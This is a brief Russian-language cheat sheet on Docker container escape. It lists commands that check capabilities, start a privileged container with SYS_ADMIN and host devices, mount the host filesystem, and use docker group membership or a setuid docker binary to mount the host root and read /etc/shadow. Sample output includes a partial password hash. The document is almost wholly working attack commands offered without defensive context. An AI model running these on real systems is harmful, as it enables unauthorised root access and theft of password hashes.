Прсомотр capabilities в контейнере
```bash
apt-get install libcap2-bin
capsh --print
```

Запуск контейнера на хосте:
```bash
# Run vulnarable container on host
docker run -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined --device=/dev/:/ ubuntu bash
```

Монтируем хостовую файловую систему
```bash
lsblk
mount /<device_file> /mnt
cd /mnt
ls -la
```

Используя тот факт, что пользователь включен в docker группу, просматриваем всю файловую систему, смонтировав ее себе
```
(host)$ sudo -v
Sorry, user unpriv may not run sudo on host. (host)$ groups | grep -o docker
docker
(host)$ docker run -it --rm -v /:/host ubuntu:latest bash (cont)# grep admin /host/etc/shadow admin:$6$VOSV5AVQ$jHWxAVAUgl...:18142:0:99999:7:::
```

Запуск docker с установленным setuid
```
(host)$ sudo -v
Sorry, user unpriv may not run sudo on host. (host)$ groups | grep -o docker
(host)$ ls -halt /usr/bin/docker
-rwsr-xr-x 1 root root 85M okt 18 17:52 /usr/bin/docker
(host)$ docker run -it --rm -v /:/host ubuntu:latest bash (cont)# grep admin /host/etc/shadow admin:$6$VOSV5AVQ$jHWxAVAUgl...:18142:0:99999:7:::
```